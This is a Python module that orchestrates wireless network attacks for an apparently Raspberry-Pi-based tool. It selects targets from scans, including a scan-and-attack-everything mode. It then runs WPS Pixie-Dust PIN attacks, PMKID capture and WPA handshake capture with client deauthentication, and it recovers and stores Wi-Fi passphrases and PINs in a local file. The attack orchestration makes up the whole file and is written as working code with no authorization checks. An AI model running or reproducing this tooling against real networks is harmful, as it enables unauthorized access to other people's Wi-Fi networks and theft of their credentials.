# -*- coding: utf-8 -*-
"""Native attack orchestrator — replaces the old wifite2 driver.

Resolves a target list (multi-BSSID include/exclude + band filter), brings the
external adapter into monitor mode once, then runs WPS pixie and/or WPA capture
per target, emitting the same status_cb dict shapes ui/screens.py already knows.
Capture-only: handshakes are saved and recorded (psk=None); cracking is manual.
"""
import subprocess
import shutil
import time

import config
from attack import interface as iface_mod
from attack import scanner as sc
from attack import tools, wpa, wps
from attack import wps_log
from attack.model import AttackRequest, AttackResult, AttackEvent, EventType
from cracked_store import load_cracked, save_cracked

try:
    from attack import pmkid as pmkid_mod
except Exception:  # noqa: BLE001
    pmkid_mod = None


# Reload the rtw88 firmware every N WPS targets to clear the monitor-mode stress
# that otherwise wedges the RTL8822BU into a hard death (only reboot recovers).
_REFRESH_EVERY = 3


# ---------------------------------------------------------------------------
# Request building
# ---------------------------------------------------------------------------
def _band_of(channel):
    try:
        ch = int(channel)
    except (ValueError, TypeError):
        return None
    return "2.4" if ch <= 14 else "5"


def _attacks_for(preset):
    """Which attacks to run + optional WPS-time override, from a preset or config."""
    if preset is not None:
        return set(preset.get("attacks", [])), preset.get("wps_time")
    attacks = set()
    if config.opt_bool(config.attack_modes, "WPA", True):
        attacks.add("wpa")
    if config.opt_bool(config.attack_modes, "WPS Pixie", True):
        attacks.add("wps")
    if config.opt_bool(config.attack_modes, "PMKID", False):
        attacks.add("pmkid")
    return attacks, None


# preset key -> (container name, option name). A preset is a self-contained
# recipe: any key present overrides that option on a COPY of the config for this
# run only (live config is never touched).
_PRESET_MAP = {
    "wps_time":    ("timing", "WPS Timeout"),
    "wpa_time":    ("timing", "WPA Timeout"),
    "num_deauths": ("timing", "Num Deauths"),
    "deauth_sec":  ("timing", "Deauth Sec"),
    "deauth":      ("attack_modes", "Deauth"),
    "tool":        ("attack_modes", "WPS Tool"),
    "ignore_locks": ("attack_modes", "Ignore Locks"),
    "band":        ("filters", "Band"),
    "max_targets": ("filters", "Max Targets"),
    "min_signal":  ("filters", "Min Signal"),
    "ignore_cracked": ("filters", "Ignore Cracked"),
}


def _set_opt(container, name, value):
    for o in container:
        if o.get("name") == name:
            o["state"] = value
            return


def _apply_preset_overrides(preset, snapshots):
    """Stamp preset keys onto the copied snapshots. `snapshots` is a dict of
    container-name -> list-of-option-dicts."""
    if not preset:
        return
    for key, (container, opt_name) in _PRESET_MAP.items():
        if key in preset:
            _set_opt(snapshots[container], opt_name, preset[key])


def build_request(iface, preset=None):
    attacks, _ = _attacks_for(preset)
    snapshots = {
        "attack_modes": [dict(x) for x in config.attack_modes],
        "timing": [dict(x) for x in config.timing],
        "filters": [dict(x) for x in config.filters],
    }
    _apply_preset_overrides(preset, snapshots)
    band = config.opt_state(snapshots["filters"], "Band", "Both")
    bands = {"2.4": "2", "5": "5"}.get(band, "both")
    return AttackRequest(
        interface=iface_mod.iface_name(iface),
        preset=preset,
        target_bssids=list(config.Runtime.target_bssids),
        exclude_bssids=list(config.Runtime.excluded_bssids),
        exclude_essids=list(config.Runtime.excluded_essids),
        bands=bands,
        attacks=attacks,
        attack_modes=snapshots["attack_modes"],
        timing=snapshots["timing"],
        filters=snapshots["filters"],
    )


# ---------------------------------------------------------------------------
# Target resolution
# ---------------------------------------------------------------------------
def _as_target(net):
    return {"essid": net.get("essid"),
            "bssid": config._norm_bssid(net.get("bssid")) or net.get("bssid"),
            "channel": net.get("channel"), "signal": net.get("signal"),
            "wps": net.get("wps")}


def _filtered(nets, req, preset=None):
    cracked_bssids = set()
    if config.opt_bool(req.filters, "Ignore Cracked", False):
        cracked_bssids = {
            config._norm_bssid(e.get("bssid"))
            for e in load_cracked() if e.get("psk")}
    min_sig = config.opt_int(req.filters, "Min Signal", None)
    runtime_excl = {config._norm_bssid(b) for b in (req.exclude_bssids or [])}
    runtime_excl |= config.excluded_bssids()
    runtime_excl_essid = {(e or "").strip().upper()
                          for e in (req.exclude_essids or [])}
    out = []
    for n in nets:
        b = config._norm_bssid(n.get("bssid"))
        if not b:
            continue
        # Hardcoded + runtime excludes — match by normalized BSSID first.
        if b in runtime_excl or config.is_excluded_net(n):
            try:
                from attack import tools
                tools.log("skip excluded %s (%s)" % (
                    b, n.get("essid") or "?"))
            except Exception:  # noqa: BLE001
                pass
            continue
        essid = (n.get("essid") or "").strip()
        if essid.upper() in runtime_excl_essid:
            continue
        if b in cracked_bssids:
            continue
        if req.bands != "both" and _band_of(n.get("channel")) not in (None, req.bands):
            continue
        # WPA handshake / PMKID only exist on encrypted networks — open (and
        # WEP) APs have no WPA handshake to capture, so skip them when only
        # those attacks are running. WPS can still apply on open nets.
        if not (req.attacks - {"wpa", "pmkid"}):
            if n.get("enc") in ("OPEN", "WEP"):
                continue
        # Missing signal must not count as -100 (was wiping whole Rush lists).
        sig = n.get("signal")
        if min_sig is not None and sig is not None and sig < min_sig:
            continue
        out.append(n)
    return out


def _order_targets(nets, req):
    """When WPS is enabled, put known-WPS APs first; never drop unknowns."""
    if "wps" in req.attacks:
        return sc.sort_wps_first(nets)
    return sc.sort_by_signal(nets)


def _resolve_targets(iface_name, req, preset, status_cb, stop_flag):
    """Return a list of target dicts. Uses the multi-select include list when
    present, otherwise scans for `scan` seconds and takes everything found."""
    from attack import tools as _tools
    scan_map = {config._norm_bssid(n.get("bssid")): n
                for n in config.Runtime.last_scan}
    if req.target_bssids:
        chosen = [scan_map[b] for b in (
            config._norm_bssid(x) for x in req.target_bssids) if b in scan_map]
        kept = _order_targets(_filtered(chosen, req, preset), req)
        if kept:
            return [_as_target(n) for n in kept]
        # Stale selection or filters removed everything — don't die with
        # "no targets"; fall through to a fresh scan.
        _tools.log(
            "targets: selection empty (map=%d chosen=%d) — rescanning"
            % (len(scan_map), len(chosen)))

    if config.Runtime.target_bssid and not req.target_bssids:
        # single picked target (only when multi-list is empty)
        one = scan_map.get(config._norm_bssid(config.Runtime.target_bssid), {
            "essid": config.Runtime.target_essid,
            "bssid": config.Runtime.target_bssid,
            "channel": config.Runtime.target_channel})
        # Still honor hardcoded excludes for a manually picked target.
        if config.is_excluded_net(one):
            return []
        return [_as_target(one)]
    # Quick Attack / pillage: scan then take all.
    dur = int((preset or {}).get("scan", config.opt_int(req.timing, "Scan Time", 30)))
    if status_cb:
        status_cb({"type": "message", "text": "scanning %ds..." % dur})

    def _scan_progress(nets):
        if status_cb:
            found = [{"essid": n.get("essid") or n.get("bssid"),
                      "bssid": n.get("bssid"),
                      "signal": n.get("signal")} for n in nets]
            status_cb({"type": "scan", "targets": len(nets), "found": found})

    nets = sc.scan(iface_name, duration=dur, progress_cb=_scan_progress,
                   stop_flag=stop_flag)
    if not nets and config.Runtime.last_scan:
        # Fresh iw scan often times out on a wedged USB stick; reuse last good
        # Scan & Attack / prior Rush list so we don't die with "no targets".
        _tools.log("targets: fresh scan empty — reusing last_scan=%d"
                   % len(config.Runtime.last_scan))
        nets = list(config.Runtime.last_scan)
    else:
        config.Runtime.last_scan = nets
    raw_n = len(nets)
    nets = _order_targets(_filtered(nets, req, preset), req)
    _tools.log("targets: scan=%d after_filter=%d band=%s min_sig=%s"
               % (raw_n, len(nets), req.bands,
                  config.opt_int(req.filters, "Min Signal", None)))
    cap = config.opt_int(req.filters, "Max Targets", None)
    if cap:
        nets = nets[:cap]
    return [_as_target(n) for n in nets]


# ---------------------------------------------------------------------------
# Plan preview (for ui CommandPreview)
# ---------------------------------------------------------------------------
def plan_lines(req, n_targets):
    """Pre-flight plan — the REAL values for this run, read straight from the
    request (which already has the launching preset's overrides applied). Each
    line reflects only the attacks that will actually run."""
    band = {"2": "2.4GHz", "5": "5GHz", "both": "2.4+5GHz"}[req.bands]
    lines = ["iface: %s" % req.interface, "band: %s" % band]
    if "wps" in req.attacks:
        lines.append("WPS pixie %s %ss" % (
            config.opt_state(req.attack_modes, "WPS Tool", "reaver"),
            config.opt_int(req.timing, "WPS Timeout", 180)))
    if "pmkid" in req.attacks:
        lines.append("PMKID %ss (clientless)" %
                     config.opt_int(req.timing, "WPA Timeout", 300))
    if "wpa" in req.attacks:
        wpa_t = config.opt_int(req.timing, "WPA Timeout", 300)
        if config.opt_bool(req.attack_modes, "Deauth", True):
            lines.append("WPA %ss deauth x%d" % (
                wpa_t, config.opt_int(req.timing, "Num Deauths", 5)))
        else:
            lines.append("WPA %ss passive" % wpa_t)
    if not (req.attacks & {"wps", "wpa", "pmkid"}):
        lines.append("survey only (no attack)")
    lines.append("targets: %s" % (n_targets if n_targets else "scan"))
    return lines


# ---------------------------------------------------------------------------
# NetworkManager handoff (same behaviour as the old attacker.py)
# ---------------------------------------------------------------------------
def _nm_set_managed(iface_name, managed):
    nmcli = shutil.which("nmcli") or "/usr/bin/nmcli"
    try:
        subprocess.run([nmcli, "device", "set", iface_name, "managed",
                        "yes" if managed else "no"],
                       capture_output=True, timeout=8)
    except Exception:  # noqa: BLE001
        pass


def _record_capture(essid, bssid, cap=None, psk=None, typ="WPA", pin=None,
                    channel=None):
    """Persist a capture/crack to cracked.json (dedup by normalized BSSID)."""
    entries = load_cracked()
    want = config._norm_bssid(bssid)
    for e in entries:
        if config._norm_bssid(e.get("bssid")) == want:
            if cap:
                e["cap"] = cap
            if psk and not e.get("psk"):
                e["psk"] = psk
            if pin and not e.get("pin"):
                e["pin"] = pin
            if channel and not e.get("channel"):
                e["channel"] = channel
            if essid and (not e.get("essid") or
                          e.get("essid") == e.get("bssid")):
                e["essid"] = essid
            save_cracked(entries)
            return
    entries.append({"type": typ, "date": int(time.time()), "essid": essid,
                    "bssid": want or bssid, "pin": pin, "psk": psk, "cap": cap,
                    "channel": channel})
    save_cracked(entries)


def _ensure_mon(iface, iface_name, mon, status_cb):
    """If the USB card vanished, recover + re-enter monitor. Returns
    (iface, iface_name, mon) or (None, None, None) if dead."""
    if any(n == iface_name or n.startswith(iface_name)
           for n, _ in iface_mod.get_interfaces()):
        return iface, iface_name, mon
    if status_cb:
        status_cb({"type": "message", "text": "usb recover..."})
    recovered = iface_mod.recover_external_usb(wait=3.0, force=True)
    if not recovered:
        if status_cb:
            status_cb({"type": "message", "text": "usb dead-replug"})
        return None, None, None
    iface = recovered
    iface_name = iface_mod.iface_name(iface)
    mon = iface_mod.enable_monitor(iface_name) or iface_name
    config.Runtime.monitor_iface = mon
    _nm_set_managed(iface_name, False)
    return iface, iface_name, mon


def _retry_pending_getpsk(pending, mon, iface, iface_name, req, emit,
                          status_cb, stop_flag, results):
    """After the target list: one more GETPSK pass for PIN-without-PSK APs.

    Pixie often locks/rate-limits WPS; waiting until the list finishes gives
    the AP time to cool before reaver -p tries again.
    """
    if not pending:
        return 0
    if results.get("cancelled") or (stop_flag and stop_flag.is_set()):
        return 0
    cool = 45
    pending = sorted(
        pending,
        key=lambda it: (it.get("target") or {}).get("signal") or -999,
        reverse=True)
    if status_cb:
        status_cb({"type": "message",
                   "text": "GETPSK retry %d..." % len(pending)})
    tools.log("getpsk-retry pass n=%d cool=%ss" % (len(pending), cool))
    time.sleep(cool)

    tool = config.opt_state(req.attack_modes, "WPS Tool", "reaver")
    run_id = results.get("run_id")
    got = 0
    total = len(pending)
    for i, item in enumerate(pending, 1):
        if stop_flag and stop_flag.is_set():
            results["cancelled"] = True
            break
        iface, iface_name, mon = _ensure_mon(iface, iface_name, mon, status_cb)
        if not mon:
            results["failed"].append(item.get("essid") or "?")
            break

        t = item["target"]
        pin = item["pin"]
        essid = item["essid"]
        bssid = item["bssid"]
        emit(AttackEvent(EventType.TARGET, essid=essid, bssid=bssid,
                         current=i, total=total))
        emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
                         phase="GETPSK", countdown=wps.GETPSK_TIMEOUT,
                         cd_max=wps.GETPSK_TIMEOUT, signal=t.get("signal")))
        t0 = time.time()
        psk = wps.recover_psk_on(mon, t, pin, emit, stop_flag, tool=tool)
        elapsed = time.time() - t0
        wps_log.method({
            "run_id": run_id, "bssid": bssid, "essid": essid,
            "ch": t.get("channel"), "sig": t.get("signal"),
            "method": "getpsk_retry", "result": "psk" if psk else "fail",
            "reason": "ok" if psk else "no psk", "pin": pin, "t": elapsed,
            "won": 1 if psk else 0, "upgraded": 1 if psk else 0,
        })
        if psk:
            got += 1
            results["psk_retry"] = results.get("psk_retry", 0) + 1
            emit(AttackEvent(EventType.CRACKED, essid=essid, bssid=bssid,
                             credential=psk, pin=pin))
            _record_capture(essid, bssid, psk=psk, pin=pin, typ="WPS",
                            channel=t.get("channel"))
            want = config._norm_bssid(bssid)
            for c in results["cracked"]:
                if config._norm_bssid(c.get("bssid")) == want:
                    c["psk"] = psk
                    break
            else:
                results["cracked"].append(
                    {"essid": essid, "psk": psk, "bssid": bssid, "pin": pin})
            tools.log("getpsk-retry ok %s %s" % (bssid, essid))
        else:
            tools.log("getpsk-retry miss %s %s" % (bssid, essid))
        time.sleep(1.0)
    tools.log("getpsk-retry done ok=%d/%d" % (got, total))
    return got


# ---------------------------------------------------------------------------
# Main entry
# ---------------------------------------------------------------------------
def run(iface, preset=None, progress_cb=None, status_cb=None, stop_flag=None):
    # Fast path: use the iface the UI already picked. Do NOT USB-recover here —
    # that was adding 10–20s to every Rush start.
    if not iface:
        iface = iface_mod.pick_external()
    if not iface:
        return AttackResult(ok=False, error="no external wifi", elapsed=0.0)

    req = build_request(iface, preset=preset)
    iface_name = req.interface
    start = time.time()

    def emit(ev):
        if not status_cb:
            return
        if ev.type == EventType.TARGET:
            status_cb({"type": "attack", "essid": ev.essid, "bssid": ev.bssid,
                       "current": ev.current, "total": ev.total})
        else:
            status_cb(ev.as_dict())

    run_id = wps_log.new_run_id()
    results = {"cracked": [], "handshakes": [], "failed": [], "cancelled": False,
               "run_id": run_id,
               "psk_inline": 0, "pin_only": 0,
               "win_reaver": 0, "win_oneshot": 0, "win_vendor": 0,
               "psk_getpsk": 0, "psk_retry": 0}
    getpsk_ok = 0
    tools.log("run-start run_id=%s preset=%s" % (
        run_id, (preset or {}).get("name") if preset else "config"))

    try:
        # Scan while NM can still drive the card — unmanage AFTER target list.
        targets = _resolve_targets(iface_name, req, preset, status_cb, stop_flag)
        if not targets:
            return AttackResult(ok=False, error="scan empty",
                                monitor_iface=iface_name,
                                elapsed=time.time() - start)

        _nm_set_managed(iface_name, False)

        mon = iface_mod.enable_monitor(iface_name)
        if not mon:
            # Card may have wedged between scan and monitor — one recover retry.
            recovered = iface_mod.recover_external_usb(wait=3.0, force=True)
            if recovered:
                iface = recovered
                iface_name = iface_mod.iface_name(iface)
                mon = iface_mod.enable_monitor(iface_name)
            if not mon:
                return AttackResult(ok=False, error="monitor mode failed",
                                    monitor_iface=iface_name,
                                    elapsed=time.time() - start)
        config.Runtime.monitor_iface = mon

        total = len(targets)
        # PIN found but GETPSK missed — retry after the full list (AP cool-down).
        pending_getpsk = []
        for i, t in enumerate(targets, 1):
            if stop_flag and stop_flag.is_set():
                results["cancelled"] = True
                break
            # If the USB card died mid-run, try recover before the next AP.
            if not any(n == iface_name or n.startswith(iface_name)
                       for n, _ in iface_mod.get_interfaces()):
                if status_cb:
                    status_cb({"type": "message", "text": "usb recover..."})
                recovered = iface_mod.recover_external_usb(wait=3.0, force=True)
                if not recovered:
                    results["failed"].append(t.get("essid") or "?")
                    if status_cb:
                        status_cb({"type": "message",
                                   "text": "usb dead-replug"})
                    break
                iface = recovered
                iface_name = iface_mod.iface_name(iface)
                mon = iface_mod.enable_monitor(iface_name) or iface_name
                config.Runtime.monitor_iface = mon
                _nm_set_managed(iface_name, False)

            # Proactive firmware refresh: the RTL8822BU wedges under sustained
            # monitor + OneShot managed switching, then dies so hard only a
            # reboot recovers it. Reload the rtw88 stack every few APs (only
            # when WPS is running — that's the stressful path) to clear the
            # accumulated stress while the device is still healthy.
            if ("wps" in req.attacks and i > 1
                    and (i - 1) % _REFRESH_EVERY == 0):
                if status_cb:
                    status_cb({"type": "message", "text": "usb refresh..."})
                new_mon = iface_mod.refresh_external(iface_name)
                if new_mon:
                    mon = new_mon
                    config.Runtime.monitor_iface = mon
                else:
                    tools.log("proactive refresh failed — recovering")
                    recovered = iface_mod.recover_external_usb(wait=3.0, force=True)
                    if not recovered:
                        results["failed"].append(t.get("essid") or "?")
                        break
                    iface = recovered
                    iface_name = iface_mod.iface_name(iface)
                    mon = iface_mod.enable_monitor(iface_name) or iface_name
                    config.Runtime.monitor_iface = mon
                    _nm_set_managed(iface_name, False)

            emit(AttackEvent(EventType.TARGET, essid=t.get("essid"),
                             bssid=t.get("bssid"), current=i, total=total))

            if "wps" in req.attacks:
                r = wps.pixie(mon, t, req, emit, stop_flag,
                             run_id=run_id, iface_name=iface_name)
                if r.get("mon"):
                    mon = r["mon"]
                    config.Runtime.monitor_iface = mon
                if r.get("cancelled"):
                    results["cancelled"] = True
                    break
                if r.get("ok"):
                    cred = r.get("psk") or r.get("pin")
                    results["cracked"].append({"essid": r["essid"], "psk": cred,
                                              "bssid": r.get("bssid"),
                                              "pin": r.get("pin")})
                    _record_capture(r["essid"], r["bssid"], psk=r.get("psk"),
                                    pin=r.get("pin"), typ="WPS",
                                    channel=t.get("channel"))
                    w = r.get("winner")
                    if w == "reaver_pixie":
                        results["win_reaver"] += 1
                    elif w == "oneshot_pixie":
                        results["win_oneshot"] += 1
                    elif w == "vendor_pin":
                        results["win_vendor"] += 1
                    if r.get("psk_from") == "getpsk":
                        results["psk_getpsk"] += 1
                    if r.get("psk"):
                        results["psk_inline"] += 1
                        continue
                    if r.get("pin"):
                        results["pin_only"] += 1
                        pending_getpsk.append({
                            "target": t, "pin": r["pin"],
                            "essid": r["essid"], "bssid": r["bssid"]})
                    # PIN-only: still try handshake below if WPA is enabled.

            if "pmkid" in req.attacks and pmkid_mod:
                r = pmkid_mod.capture(mon, t, req, emit, stop_flag)
                if r.get("mon"):
                    # pmkid.capture() reloads the rtw88 stack before every
                    # attempt (required for it to capture anything on this
                    # hardware — see attack/pmkid.py), which can hand back a
                    # differently-named interface; keep the shared `mon` in
                    # sync so wpa/wps attacks later in this run use the real
                    # current name instead of one that no longer exists.
                    mon = r["mon"]
                    config.Runtime.monitor_iface = mon
                if r.get("ok"):
                    results["handshakes"].append({"essid": r["essid"],
                                                  "cap": r.get("hash")})
                    _record_capture(r["essid"], r["bssid"], cap=r.get("hash"),
                                    typ="PMKID", channel=t.get("channel"))
                    continue

            if "wpa" in req.attacks:
                r = wpa.capture(mon, t, req, emit, stop_flag)
                if r.get("cancelled"):
                    results["cancelled"] = True
                    break
                if r.get("ok"):
                    results["handshakes"].append({"essid": r["essid"],
                                                  "cap": r.get("cap")})
                    _record_capture(r["essid"], r["bssid"], cap=r.get("cap"),
                                    channel=t.get("channel") or r.get("channel"))
                else:
                    results["failed"].append(r.get("essid"))

        getpsk_ok = _retry_pending_getpsk(
            pending_getpsk, mon, iface, iface_name, req, emit, status_cb,
            stop_flag, results)
    finally:
        iface_mod.disable_monitor(config.Runtime.monitor_iface or iface_name)
        _nm_set_managed(iface_name, True)
        config.Runtime.monitor_iface = None
        # If the external card hard-wedged (dropped off the bus), no software
        # can revive it on the Pi Zero 2 W — reboot the box so the adapter comes
        # back automatically instead of staying dead until a manual reboot.
        # Delayed so the run-metric + UI finish first (cracked.json is already saved).
        try:
            if not iface_mod.pick_external():
                if not iface_mod.recover_external_usb(wait=2.0):
                    tools.log("usb hard-dead after attack — rebooting in 30s")
                    iface_mod.run(
                        ["sh", "-c",
                         "nohup sh -c 'sleep 30; reboot' >/dev/null 2>&1 &"],
                        timeout=5)
        except Exception:  # noqa: BLE001
            pass
        # Restart NM so the internal wl0 reconnects to its home network (restores
        # SSH — monitor-mode churn on the external card disrupts NM's wl0).
        try:
            from network import connect as _net_connect
            _net_connect.restore_network()
        except Exception:  # noqa: BLE001
            pass

    from attack import tools as _tools
    pin_only_left = sum(
        1 for c in results["cracked"]
        if c.get("pin") and not c.get("psk"))
    _tools.log(
        "run-metric run_id=%s cracked=%d pin_only=%d hs=%d failed=%d "
        "cancelled=%s elapsed=%.1f preset=%s getpsk_retry=%d "
        "psk_inline=%d pin_queued=%d "
        "win_reaver=%d win_oneshot=%d win_vendor=%d "
        "psk_getpsk=%d psk_retry=%d"
        % (results.get("run_id"), len(results["cracked"]), pin_only_left,
           len(results["handshakes"]), len(results["failed"]),
           results["cancelled"], time.time() - start,
           (preset or {}).get("name") if preset else "config",
           getpsk_ok, results.get("psk_inline", 0),
           results.get("pin_only", 0),
           results.get("win_reaver", 0), results.get("win_oneshot", 0),
           results.get("win_vendor", 0), results.get("psk_getpsk", 0),
           results.get("psk_retry", 0)))

    return AttackResult(
        ok=not results["cancelled"],
        cancelled=results["cancelled"],
        cracked=results["cracked"],
        handshakes=results["handshakes"],
        failed=results["failed"],
        command=" · ".join(plan_lines(req, len(targets))),
        monitor_iface=iface_name,
        elapsed=time.time() - start,
    )
